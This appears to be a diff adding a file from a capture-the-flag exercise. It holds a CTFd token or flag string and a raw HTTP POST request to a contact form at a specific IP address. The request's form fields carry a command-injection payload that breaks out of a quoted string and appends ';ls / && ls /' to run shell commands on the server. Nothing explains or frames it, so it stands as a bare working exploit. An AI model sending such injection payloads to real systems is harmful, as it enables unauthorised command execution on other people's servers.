@@ -1,0 +1,19 @@
+ctfd_885dad8cb7f7ddc9d190a19a010666ae570bd5c24db506fe9d6b61684ea7d482
+
+POST /contact HTTP/1.1
+Host: 103.162.14.116:5001
+Content-Length: 62
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://103.162.14.116:5001
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://103.162.14.116:5001/contact
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+name=aaaaa%22%5C&advice=bbbb%3bls%20%2f%20%26%26%20ls%20%2f%22
+
+
